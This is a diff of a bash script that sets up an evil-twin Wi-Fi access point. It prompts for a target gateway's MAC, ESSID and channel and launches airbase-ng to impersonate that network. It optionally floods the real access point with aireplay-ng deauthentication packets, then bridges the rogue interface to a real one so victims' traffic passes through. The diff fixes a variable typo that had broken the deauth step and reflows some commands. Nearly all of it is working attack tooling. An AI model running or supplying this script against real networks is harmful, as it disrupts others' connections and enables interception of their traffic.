@@ -19,7 +19,7 @@ sleep 0.5
 #######################
 ###### USER INPUT #####
 #######################
-
+echo
 # --- ACCESS POINT -------
 echo -n "[*] Access Point (Gateway) Address: "
 read apMac
@@ -55,9 +55,8 @@ sleep 3
 
 echo "[+] Opening XTERM Console"
 sleep 2
-sudo xterm -hold -e "airbase-ng -a $apMac --essid $essid -c $channel $interface" &
-sleep 4
-echo -n "[*] DEAUTH Access Point $essid ?[Y/n]: "
+sudo xterm -hold -e "airbase-ng -a $apMac --essid $essid -c $channel $interface" & 
+sleep 4&&echo -n "[*] DEAUTH Access Point $essid ?[Y/n]: "
 read b
 
 #DEAUTH
@@ -66,7 +65,7 @@ case $b in
 		echo -n "[*] How many DEAUTH-PACKETS?: "&& read NUM &&echo
 		sleep 2
 		echo "[+] Opening XTERM Console"
-                sudo xterm -hold -e "aireplay-ng -0 $NUM -a $apMAC $interface" &
+                sudo xterm -hold -e "aireplay-ng -0 $NUM -a $apMac $interface" &
 		;;
 esac
 sleep 5&&echo&&echo "[+] BRIDGING interfaces with Bridge-utils..."
@@ -80,9 +79,12 @@ brctl addif $bridgeIfName $interface
 echo "[+] $interface BRIDGED with $bridgeIfName"&&sleep 3
 brctl addif $bridgeIfName $airbaseIfName
 echo "[+] $airbaseIfName BRIDGED with $bridgeIfName"&&sleep 3&&echo "[+] Bridged Interfaces UP"
-ifconfig $airbaseIfName 0.0.0.0 up&&sleep 0.4
-ifconfig $bridgeIfName up&&sleep 0.4
-dhclient $bridgeIfName&&sleep 3
+ifconfig $airbaseIfName 0.0.0.0 up
+sleep 0.4
+ifconfig $bridgeIfName up
+sleep 0.4
+dhclient $bridgeIfName
+sleep 3
 
 
 echo&&sleep 2&&echo "Done. :)"&&sleep 1
